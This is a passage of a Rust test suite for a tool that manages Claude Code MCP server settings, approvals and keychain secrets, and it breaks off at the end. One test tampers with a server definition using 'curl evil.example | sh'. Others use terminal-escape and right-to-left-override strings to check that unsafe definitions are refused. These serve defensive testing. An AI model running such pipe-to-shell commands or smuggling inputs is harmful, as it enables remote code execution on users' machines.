        let core = env.start();
        let events = collect(&core, |e| final_status(e, "bad-stdio").is_some());
        let id = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => s.servers.first().map(|r| r.id()),
                _ => None,
            })
            .unwrap();
        core.send(Command::Diagnose(id));
        let events = collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
        assert_eq!(final_status(&events, "bad-stdio"), Some(Status::Failed));
    }

    // ---- changing the configuration

    fn config_json(env: &Env) -> serde_json::Value {
        let text =
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
        serde_json::from_str(&text).unwrap()
    }

    fn write_config(env: &Env, value: &serde_json::Value) {
        std::fs::write(
            env.dir.path().join("cfg").join(".claude.json"),
            serde_json::to_string_pretty(value).unwrap(),
        )
        .unwrap();
    }

    /// Two projects, a user server with a secret, and a local server in one of them.
    fn two_projects(env_dir_hint: &str) -> serde_json::Value {
        serde_json::json!({
            "numStartups": 3,
            "mcpServers": {"gw": {"type": "stdio", "command": "node", "env": {"TOKEN": "s3cret-value"}}},
            "projects": {
                "/work/a": {"mcpServers": {"loc": {"type": "stdio", "command": "x"}}, "disabledMcpServers": []},
                "/work/b": {"disabledMcpServers": ["other"]}
            },
            "tail": env_dir_hint
        })
    }

    fn quiet_env(claude_json: &serde_json::Value) -> Env {
        Env::new(claude_json, r#"{"rules":[]}"#, &[])
    }

    fn user_id(name: &str) -> ServerId {
        ServerId {
            scope: Scope::User,
            project: None,
            name: name.to_owned(),
        }
    }

    fn local_id(name: &str, project: &str) -> ServerId {
        ServerId {
            scope: Scope::Local,
            project: Some(project.to_owned()),
            name: name.to_owned(),
        }
    }

    fn plan_for(core: &Core, changes: Vec<Change>) -> PlanView {
        core.send(Command::Prepare(changes));
        let events = collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::PlanReady(_) | Event::PlanFailed(_)))
        });
        events
            .into_iter()
            .find_map(|e| match e {
                Event::PlanReady(p) => Some(p),
                _ => None,
            })
            .expect("a plan")
    }

    fn disabled_list(env: &Env, project: &str) -> serde_json::Value {
        config_json(env)["projects"][project]["disabledMcpServers"].clone()
    }

    #[test]
    fn switching_a_user_server_off_covers_every_known_project() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        assert!(!plan.nothing_to_do);
        assert!(
            plan.warnings.iter().any(|w| w.contains("2 projects")),
            "{:?}",
            plan.warnings
        );
        core.send(Command::Apply(plan.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
                && e.iter().any(|x| {
                    matches!(x, Event::Snapshot(s)
                        if s.servers.iter().any(|r| r.name == "gw" && !r.enabled))
                })
        });
        assert!(events.iter().any(|e| matches!(
            e,
            Event::Applied {
                backup: Some(_),
                ..
            }
        )));
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["gw"]));
        assert_eq!(
            disabled_list(&env, "/work/b"),
            serde_json::json!(["other", "gw"])
        );
        // Everything else is as it was, in the same order.
        let now = config_json(&env);
        let keys: Vec<_> = now.as_object().unwrap().keys().cloned().collect();
        assert_eq!(keys, ["numStartups", "mcpServers", "projects", "tail"]);
        assert_eq!(now["mcpServers"], two_projects("end")["mcpServers"]);
    }

    #[test]
    fn switching_a_user_server_back_on_removes_it_everywhere() {
        let mut start = two_projects("end");
        start["projects"]["/work/a"]["disabledMcpServers"] = serde_json::json!(["gw"]);
        start["projects"]["/work/b"]["disabledMcpServers"] = serde_json::json!(["gw", "other"]);
        let env = quiet_env(&start);
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: true,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!([]));
        assert_eq!(disabled_list(&env, "/work/b"), serde_json::json!(["other"]));
    }

    #[test]
    fn a_local_server_is_switched_in_its_own_project_only() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));
        assert_eq!(disabled_list(&env, "/work/b"), serde_json::json!(["other"]));
    }

    #[test]
    fn several_changes_make_one_plan_and_one_backup() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![
                Change::SetEnabled {
                    id: local_id("loc", "/work/a"),
                    enabled: false,
                },
                Change::SetEnabled {
                    id: user_id("gw"),
                    enabled: false,
                },
            ],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert_eq!(
            disabled_list(&env, "/work/a"),
            serde_json::json!(["loc", "gw"])
        );
        assert_eq!(
            std::fs::read_dir(env.dir.path().join("backups"))
                .unwrap()
                .count(),
            1
        );
    }

    #[test]
    fn the_plan_never_shows_server_settings() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        let shown = format!("{plan:?}");
        assert!(shown.contains("gw") && !shown.contains("s3cret"), "{shown}");
    }

    #[test]
    fn a_plan_can_be_applied_once_and_not_after_it_is_discarded() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let change = Change::SetEnabled {
            id: local_id("loc", "/work/a"),
            enabled: false,
        };
        let first = plan_for(&core, vec![change.clone()]);
        core.send(Command::Apply(first.id));
        core.send(Command::Apply(first.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
                && e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::ApplyFailed { plan, .. } if *plan == first.id))
        );
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));

        let second = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: true,
            }],
        );
        core.send(Command::Discard(second.id));
        core.send(Command::Apply(second.id));
        collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::ApplyFailed { plan, .. } if *plan == second.id))
        });
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!(["loc"]));
    }

    #[test]
    fn a_server_that_is_gone_makes_no_plan() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        core.send(Command::Prepare(vec![Change::SetEnabled {
            id: user_id("ghost"),
            enabled: false,
        }]));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::PlanFailed(m) if m.contains("ghost")))
        );
        assert!(!events.iter().any(|e| matches!(e, Event::PlanReady(_))));
    }

    #[test]
    fn a_change_that_is_already_true_is_reported_as_nothing_to_do() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: true,
            }],
        );
        assert!(plan.nothing_to_do);
        core.send(Command::Apply(plan.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert!(events.iter().any(|e| matches!(
            e,
            Event::Applied {
                changed: false,
                backup: None,
                ..
            }
        )));
        assert!(!env.dir.path().join("backups").exists());
    }

    #[test]
    fn a_user_server_cannot_be_switched_when_no_project_is_known() {
        let env = quiet_env(
            &serde_json::json!({"mcpServers": {"gw": {"type": "stdio", "command": "x"}}}),
        );
        let core = env.start();
        core.send(Command::Prepare(vec![Change::SetEnabled {
            id: user_id("gw"),
            enabled: false,
        }]));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
        });
    }

    #[test]
    fn toggling_a_project_server_writes_only_the_user_file_and_does_not_approve_it() {
        let env = quiet_env(&serde_json::json!({}));
        let repo = env.dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        std::fs::write(
            repo.join(".mcp.json"),
            r#"{"mcpServers":{"ps":{"type":"stdio","command":"danger"}}}"#,
        )
        .unwrap();
        let key = repo.to_string_lossy().replace('\\', "/");
        write_config(&env, &serde_json::json!({"projects": {key.clone(): {}}}));
        let core = env.start();
        let id = ServerId {
            scope: Scope::Project,
            project: Some(inventory::normalise_project(&key)),
            name: "ps".to_owned(),
        };
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: id.clone(),
                enabled: true,
            }],
        );
        assert!(
            plan.warnings.iter().any(|w| w.contains("not approved")),
            "{:?}",
            plan.warnings
        );
        let plan = plan_for(&core, vec![Change::SetEnabled { id, enabled: false }]);
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        assert_eq!(
            config_json(&env)["projects"][&key]["disabledMcpServers"],
            serde_json::json!(["ps"])
        );
        // The repository was not touched: no approval file, same .mcp.json.
        assert!(!repo.join(".claude").exists());
        assert_eq!(
            std::fs::read_to_string(repo.join(".mcp.json")).unwrap(),
            r#"{"mcpServers":{"ps":{"type":"stdio","command":"danger"}}}"#
        );
    }

    #[test]
    fn a_lock_held_by_claude_stops_the_write_with_a_clear_message() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        let before =
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
        std::fs::create_dir(env.dir.path().join("cfg").join(".claude.json.lock")).unwrap();
        core.send(Command::Apply(plan.id));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
        });
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap();
        assert!(error.contains("writing its configuration"), "{error}");
        assert_eq!(
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap(),
            before
        );
    }

    #[test]
    fn a_change_claude_overwrites_a_moment_later_is_put_back() {
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(800);
        let core = start_with(config, || {});
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        // Claude saves an older copy without taking the lock, with a newer counter of its own.
        let mut theirs = two_projects("end");
        theirs["numStartups"] = serde_json::json!(4);
        write_config(&env, &theirs);
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Reapplied { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Reapplied { plan: p } if *p == plan.id))
        );
        let now = config_json(&env);
        assert_eq!(now["numStartups"], 4);
        assert_eq!(
            now["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!(["loc"])
        );
    }

    /// Applies `changes` and waits for the answer.
    fn apply_now(core: &Core, changes: Vec<Change>) {
        let plan = plan_for(core, changes);
        core.send(Command::Apply(plan.id));
        collect(core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
    }

    /// Events that arrive within `window`, without waiting for any in particular.
    fn events_for(core: &Core, window: Duration) -> Vec<Event> {
        let until = Instant::now() + window;
        let mut events = Vec::new();
        while Instant::now() < until {
            while let Some(e) = core.try_recv() {
                events.push(e);
            }
            std::thread::sleep(Duration::from_millis(20));
        }
        events
    }

    #[test]
    fn switching_back_right_away_is_not_undone_by_the_first_change() {
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(600);
        let core = start_with(config, || {});
        let loc = local_id("loc", "/work/a");
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: loc.clone(),
                enabled: false,
            }],
        );
        // Within the first change's verify window, the user switches it back on.
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: loc,
                enabled: true,
            }],
        );
        let events = events_for(&core, Duration::from_millis(3000));
        assert!(
            !events
                .iter()
                .any(|e| matches!(e, Event::Reapplied { .. } | Event::ApplyFailed { .. })),
            "{events:#?}"
        );
        assert_eq!(
            config_json(&env)["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!([])
        );
    }

    #[test]
    fn claude_overwriting_after_two_quick_changes_loses_neither() {
        // Found reviewing main: the first change's check stood down for the second, whose check only put its own
        // change back, so the first was silently lost.
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(600);
        let core = start_with(config, || {});
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        // Claude saves a copy it read before either change, without the lock.
        let mut theirs = two_projects("end");
        theirs["numStartups"] = serde_json::json!(9);
        write_config(&env, &theirs);
        let events = events_for(&core, Duration::from_millis(3000));
        assert!(
            events.iter().any(|e| matches!(e, Event::Reapplied { .. })),
            "{events:#?}"
        );
        let now = config_json(&env);
        assert_eq!(now["numStartups"], 9, "Claude's own change stays");
        assert_eq!(
            now["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!(["loc", "gw"])
        );
    }

    #[test]
    fn a_later_change_that_writes_nothing_still_has_the_earlier_one_checked() {
        // The variant: the second change finds nothing to write, yet it numbers last on the file.
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(600);
        let core = start_with(config, || {});
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        // Already off: nothing to write.
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        write_config(&env, &two_projects("end"));
        events_for(&core, Duration::from_millis(3000));
        assert_eq!(
            config_json(&env)["projects"]["/work/a"]["disabledMcpServers"],
            serde_json::json!(["loc"])
        );
    }

    #[test]
    fn a_later_change_to_another_server_still_leaves_both_in_place() {
        let env = quiet_env(&two_projects("end"));
        let mut config = env.config();
        config.verify_delay = Duration::from_millis(600);
        let core = start_with(config, || {});
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        apply_now(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        let events = events_for(&core, Duration::from_millis(3000));
        assert!(
            !events
                .iter()
                .any(|e| matches!(e, Event::Reapplied { .. } | Event::ApplyFailed { .. })),
            "{events:#?}"
        );
        let disabled = &config_json(&env)["projects"]["/work/a"]["disabledMcpServers"];
        let names: Vec<&str> = disabled
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|v| v.as_str())
            .collect();
        assert!(names.contains(&"loc") && names.contains(&"gw"), "{names:?}");
    }

    // ---- client secrets in the system's store (an in-memory one here: tests never touch the real keychain)

    fn oauth_env() -> Env {
        quiet_env(&serde_json::json!({
            "mcpServers": {
                "sso": {"type": "http", "url": "https://sso.example.com/mcp", "oauth": {"clientId": "klefki-1"}},
                "plain": {"type": "http", "url": "https://plain.example.com/mcp"}
            },
            "projects": {"/work/a": {}}
        }))
    }

    fn with_store(env: &Env, store: Arc<crate::secrets::MemoryStore>) -> Core {
        let mut config = env.config();
        config.secrets = Some(store);
        start_with(config, || {})
    }

    fn secret_status(core: &Core, id: &ServerId) -> Result<bool, String> {
        collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::SecretStatus { id: i, .. } if i == id))
        })
        .into_iter()
        .rev()
        .find_map(|e| match e {
            Event::SecretStatus { id: i, stored } if i == *id => Some(stored),
            _ => None,
        })
        .unwrap()
    }

    #[test]
    fn a_client_secret_is_stored_read_and_forgotten_under_its_connection() {
        let env = oauth_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let sso = user_id("sso");
        core.send(Command::SecretStatus(sso.clone()));
        assert_eq!(secret_status(&core, &sso), Ok(false));
        core.send(Command::StoreSecret {
            id: sso.clone(),
            secret: crate::secrets::Secret::new("s3cret-value".into()),
        });
        assert_eq!(secret_status(&core, &sso), Ok(true));
        let key = format!(
            "conn:{}",
            crate::model::ConnectionId::new(Scope::User, None, "sso").as_str()
        );
        assert_eq!(
            store.values.lock().unwrap().get(&key).map(String::as_str),
            Some("s3cret-value"),
            "keyed like v1, under dev.klefki"
        );
        core.send(Command::ForgetSecret(sso.clone()));
        assert_eq!(secret_status(&core, &sso), Ok(false));
        assert!(store.values.lock().unwrap().is_empty());
    }

    #[test]
    fn secrets_are_refused_where_they_do_not_belong_and_the_value_never_travels_back() {
        let env = oauth_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        for (id, why) in [(user_id("plain"), "OAuth"), (user_id("ghost"), "no longer")] {
            core.send(Command::StoreSecret {
                id: id.clone(),
                secret: crate::secrets::Secret::new("s3cret-value".into()),
            });
            let err = secret_status(&core, &id).unwrap_err();
            assert!(err.contains(why), "{err}");
        }
        assert!(store.values.lock().unwrap().is_empty());
        // An empty secret is not a secret.
        core.send(Command::StoreSecret {
            id: user_id("sso"),
            secret: crate::secrets::Secret::new(String::new()),
        });
        assert!(
            secret_status(&core, &user_id("sso"))
                .unwrap_err()
                .contains("empty")
        );
        core.send(Command::StoreSecret {
            id: user_id("sso"),
            secret: crate::secrets::Secret::new("s3cret-value".into()),
        });
        assert_eq!(secret_status(&core, &user_id("sso")), Ok(true));
        let everything = format!("{:?}", events_for(&core, Duration::from_millis(200)));
        assert!(!everything.contains("s3cret"), "{everything}");
    }

    #[test]
    fn without_a_secret_store_nothing_is_kept_anywhere() {
        let env = oauth_env();
        let store = Arc::new(crate::secrets::MemoryStore::default());
        *store.fail.lock().unwrap() = Some(crate::secrets::SecretError::Unavailable(
            "no Secret Service".into(),
        ));
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        core.send(Command::StoreSecret {
            id: user_id("sso"),
            secret: crate::secrets::Secret::new("s3cret-value".into()),
        });
        let err = secret_status(&core, &user_id("sso")).unwrap_err();
        assert!(err.contains("no plaintext copy"), "{err}");
        // Not written next to the configuration either.
        let dump = walk(env.dir.path());
        assert!(!dump.contains("s3cret"), "{dump}");
    }

    /// Every file's text under `dir`, to look for a value that must not be there.
    fn walk(dir: &Path) -> String {
        let mut out = String::new();
        for entry in std::fs::read_dir(dir).unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                out.push_str(&walk(&path));
            } else {
                out.push_str(&String::from_utf8_lossy(
                    &std::fs::read(&path).unwrap_or_default(),
                ));
            }
        }
        out
    }

    // ---- approving a project server

    const MCP_JSON: &str = r#"{"mcpServers":{"ps":{"type":"stdio","command":"node","args":["server.js","--port","9"],"env":{"NODE_OPTIONS":"--require ./hook.js"}}}}"#;

    /// A repository with a `.mcp.json`, known to Claude as a project. Returns the environment, the project key as
    /// the inventory spells it, and the repository path.
    fn repo_env(claude_entry: serde_json::Value) -> (Env, String, PathBuf) {
        let env = quiet_env(&serde_json::json!({}));
        let repo = env.dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        std::fs::write(repo.join(".mcp.json"), MCP_JSON).unwrap();
        let key = repo.to_string_lossy().replace('\\', "/");
        write_config(
            &env,
            &serde_json::json!({"numStartups": 1, "projects": {key.clone(): claude_entry}}),
        );
        let key = inventory::normalise_project(&key);
        (env, key, repo)
    }

    fn project_id(key: &str, name: &str) -> ServerId {
        ServerId {
            scope: Scope::Project,
            project: Some(key.to_owned()),
            name: name.to_owned(),
        }
    }

    fn approve(key: &str) -> Vec<Change> {
        vec![Change::Approve {
            id: project_id(key, "ps"),
        }]
    }

    fn settings_of(repo: &Path) -> Option<serde_json::Value> {
        std::fs::read_to_string(repo.join(".claude").join("settings.local.json"))
            .ok()
            .map(|t| serde_json::from_str(&t).unwrap())
    }

    fn apply_and_wait(core: &Core, plan: &PlanView) -> Vec<Event> {
        core.send(Command::Apply(plan.id));
        collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        })
    }

    /// The verify that runs shortly after a write (50 ms in tests) reports no failure.
    fn verify_passes(core: &Core) {
        std::thread::sleep(Duration::from_millis(400));
        let mut late = Vec::new();
        while let Some(e) = core.try_recv() {
            late.push(e);
        }
        assert!(
            !late.iter().any(|e| matches!(e, Event::ApplyFailed { .. })),
            "{late:#?}"
        );
    }

    #[test]
    fn the_plan_shows_everything_the_server_would_run_and_writes_nothing_yet() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        assert_eq!(plan.reviews.len(), 1);
        assert_eq!(
            plan.reviews[0].lines,
            [
                "Command: node",
                "Argument 1: server.js",
                "Argument 2: --port",
                "Argument 3: 9",
                "Environment: NODE_OPTIONS=--require ./hook.js",
            ]
        );
        assert!(plan.reviews[0].title.contains("ps"));
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("trust the repository")),
            "{:?}",
            plan.warnings
        );
        assert!(
            plan.warnings.iter().any(|w| w.contains(".gitignore")),
            "{:?}",
            plan.warnings
        );
        assert_eq!(plan.files.len(), 1);
        assert!(plan.files[0].path.ends_with("settings.local.json"));
        assert_eq!(plan.files[0].lines, ["  enabledMcpjsonServers", "+ ps"]);
        assert!(!repo.join(".claude").exists(), "preparing writes nothing");
    }

    #[test]
    fn approving_writes_only_the_settings_file_in_the_repository() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        let claude_json_before =
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        let events = apply_and_wait(&core, &plan);
        assert!(
            events.iter().any(|e| matches!(
                e,
                Event::Applied {
                    changed: true,
                    backup: None,
                    ..
                }
            )),
            "{events:#?}"
        );
        assert_eq!(
            settings_of(&repo),
            Some(serde_json::json!({"enabledMcpjsonServers": ["ps"]}))
        );
        // Nothing else in the repository, and no lock left behind.
        let mut top: Vec<_> = std::fs::read_dir(&repo)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        top.sort();
        assert_eq!(top, [".claude", ".mcp.json"]);
        let inner: Vec<_> = std::fs::read_dir(repo.join(".claude"))
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        assert_eq!(inner, ["settings.local.json"]);
        assert_eq!(
            std::fs::read_to_string(repo.join(".mcp.json")).unwrap(),
            MCP_JSON
        );
        // The user's own file was not touched, so there is no backup of it either.
        assert_eq!(
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap(),
            claude_json_before
        );
        assert_eq!(approval_in(&events), Some(crate::api::Approval::Approved));
    }

    /// The approval of `ps` in the last snapshot among `events`.
    fn approval_in(events: &[Event]) -> Option<crate::api::Approval> {
        events.iter().rev().find_map(|e| match e {
            Event::Snapshot(s) => s
                .servers
                .iter()
                .find(|r| r.name == "ps")
                .and_then(|r| r.approval),
            _ => None,
        })
    }

    #[test]
    fn approving_a_server_that_was_rejected_clears_the_rejection_in_both_places() {
        let (env, key, repo) =
            repo_env(serde_json::json!({"disabledMcpjsonServers": ["ps", "other"]}));
        std::fs::create_dir_all(repo.join(".claude")).unwrap();
        std::fs::write(
            repo.join(".claude").join("settings.local.json"),
            r#"{"disabledMcpjsonServers":["ps"],"keep":true}"#,
        )
        .unwrap();
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        assert_eq!(
            plan.files.len(),
            2,
            "the settings file and ~/.claude.json: {:?}",
            plan.files
        );
        let events = apply_and_wait(&core, &plan);
        assert_eq!(
            settings_of(&repo),
            Some(
                serde_json::json!({"disabledMcpjsonServers": [], "keep": true, "enabledMcpjsonServers": ["ps"]})
            )
        );
        assert_eq!(
            config_json(&env)["projects"][&key]["disabledMcpjsonServers"],
            serde_json::json!(["other"])
        );
        assert_eq!(approval_in(&events), Some(crate::api::Approval::Approved));
    }

    #[test]
    fn a_server_that_is_already_approved_needs_nothing() {
        let (env, key, repo) = repo_env(serde_json::json!({"enabledMcpjsonServers": ["ps"]}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        assert!(plan.nothing_to_do && plan.reviews.is_empty() && plan.warnings.is_empty());
        apply_and_wait(&core, &plan);
        assert!(!repo.join(".claude").exists());
    }

    #[test]
    fn a_definition_edited_after_review_is_not_approved() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        std::fs::write(
            repo.join(".mcp.json"),
            MCP_JSON.replace("\"node\"", "\"curl evil.example | sh\""),
        )
        .unwrap();
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .expect("refused");
        assert!(
            error.contains("changed") && error.contains("review it again"),
            "{error}"
        );
        assert!(!repo.join(".claude").exists());
    }

    #[test]
    fn a_server_removed_after_review_is_not_approved_either() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        std::fs::remove_file(repo.join(".mcp.json")).unwrap();
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::ApplyFailed { .. }))
        );
        assert!(!repo.join(".claude").exists());
    }

    #[test]
    fn a_server_that_cannot_be_shown_whole_is_not_offered_for_approval() {
        for definition in [
            r#"{"command":"no\u001b[2Kde"}"#,
            r#"{"command":"node","args":["a\u202eb"]}"#,
            r#"{"type":"carrier-pigeon"}"#,
            r#"{"command":"node","args":[1]}"#,
        ] {
            let (env, key, repo) = repo_env(serde_json::json!({}));
            std::fs::write(
                repo.join(".mcp.json"),
                format!(r#"{{"mcpServers":{{"ps":{definition}}}}}"#),
            )
            .unwrap();
            let core = env.start();
            core.send(Command::Prepare(approve(&key)));
            let events = collect(&core, |e| {
                e.iter()
                    .any(|x| matches!(x, Event::PlanFailed(_) | Event::PlanReady(_)))
            });
            assert!(
                events.iter().any(
                    |e| matches!(e, Event::PlanFailed(m) if m.contains("cannot be reviewed safely"))
                ),
                "{definition}: {events:#?}"
            );
            assert!(!repo.join(".claude").exists());
        }
    }

    #[test]
    fn only_project_servers_can_be_approved() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        core.send(Command::Prepare(vec![Change::Approve {
            id: user_id("gw"),
        }]));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::PlanFailed(m) if m.contains("needs no approval")))
        );
    }

    #[test]
    fn the_ignore_warning_goes_away_when_the_repository_ignores_the_file() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        std::fs::write(repo.join(".gitignore"), ".claude/settings.local.json\n").unwrap();
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        assert!(
            !plan.warnings.iter().any(|w| w.contains(".gitignore")),
            "{:?}",
            plan.warnings
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("trust the repository"))
        );
    }

    #[test]
    fn a_failure_after_the_first_file_says_what_was_already_saved() {
        let (env, key, repo) = repo_env(serde_json::json!({"disabledMcpjsonServers": ["ps"]}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        // Claude holds its lock, so the second file (~/.claude.json) cannot be written.
        std::fs::create_dir(env.dir.path().join("cfg").join(".claude.json.lock")).unwrap();
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap();
        assert!(
            error.contains("writing its configuration")
                && error.contains("Already saved")
                && error.contains("settings.local.json"),
            "{error}"
        );
        assert_eq!(
            settings_of(&repo),
            Some(serde_json::json!({"enabledMcpjsonServers": ["ps"]}))
        );
        // The rejection in ~/.claude.json is still there, so the server is still shown as rejected.
        assert_eq!(
            config_json(&env)["projects"][&key]["disabledMcpjsonServers"],
            serde_json::json!(["ps"])
        );
    }

    // ---- not spawning what is not needed

    impl Env {
        /// How many times the fake CLI was started with these leading arguments.
        fn runs(&self, leading: &[&str]) -> usize {
            std::fs::read_to_string(&self.log)
                .unwrap_or_default()
                .lines()
                .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
                .filter(|l| l["event"] == "start")
                .filter(|l| {
                    let argv = l["argv"].as_array().unwrap();
                    argv.len() >= leading.len()
                        && leading.iter().zip(argv).all(|(want, got)| got == want)
                })
                .count()
        }
    }

    const CHECKABLE: &str = r#"{"rules":[
        {"args":["--version"],"stdout_file":"version.txt"},
        {"args":["mcp","get"],"stdout_file":"connected.txt"}]}"#;

    fn checkable_env(claude_json: &serde_json::Value) -> Env {
        Env::new(
            claude_json,
            CHECKABLE,
            &[
                ("version.txt", b"2.1.302 (Claude Code)\n"),
                ("connected.txt", CONNECTED),
            ],
        )
    }

    #[test]
